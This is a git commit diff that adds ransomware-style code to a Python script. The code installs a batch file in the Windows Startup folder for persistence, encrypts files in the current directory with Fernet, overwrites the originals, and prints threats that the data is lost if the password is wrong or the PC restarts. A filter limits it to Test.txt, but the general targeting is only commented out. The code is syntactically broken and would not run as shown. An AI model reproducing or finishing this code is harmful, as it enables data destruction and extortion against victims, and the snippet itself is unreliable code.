907417936f21a60f3af47c5669306f455520907c
TheNewGuardian <info.thenewguardian@gmail.com>
2024-09-27 18:34:54 +0200

    Update main.py

--- main.py
+++ main.py
@@ -3,29 +3,51 @@ import sys
 from cryptography.fernet import Fernet
 
 files = []
-Key = []
+key = "0"
 
 def autostart():
-    # Pfad zum Autostart-Ordner des aktuellen Benutzers
+    # Path to Autostart
     autostart_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
     
-    # Name und Pfad der Verknüpfung
+    # Name and Path of Shortcut
     shortcut_name = "m.bat"
     shortcut_path = os.path.join(autostart_folder, shortcut_name)
 
-    # Erstelle eine .bat-Datei, die dein Skript beim Systemstart ausführt
+    # Creats .bat file in autosart ordner to run code at pc start
     with open(shortcut_path, 'w') as shortcut_file:
-        # Fügt den Befehl hinzu, um das Python-Skript auszuführen
+        #adds the order to start the programm at PC start
         shortcut_file.write(f'start "" "{sys.executable}" "{os.path.abspath(__file__)}"')
 
 def encrypt()
+    # Finds the files and adds them to a list
     for file in os.listdir():
-#  if file == "main.py" :
-#    continue
-  if file !="Test.txt":
-    continue
-  files.append(file)
+#      if file == "main.py" :
+#           continue
+        #this is for beeing safe and it only attaks the Test 
+       if file !="Test.txt":
+            continue
+      files.append(file)
 
+    #Generate a key for encrypting the files
+    key = fernet.generate_key()
+
+    #encrypt the files
+    for file in files
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
+
+    #Give an Output to the User
+    print("Your Files have been encrypted, they will decrypt after typing in the Password")
+    print("When your Passwort is wrong your data is away")
+    print("When you change the stuff standing in your Files, is gone too so dont do that")
+    print("And if you try to restart your Pc its not decryptabel too")
+
+
+#Execute the definitions    
 #if __name__ == '__main__':
 #    autostart()
 autostart()
+encrypt()
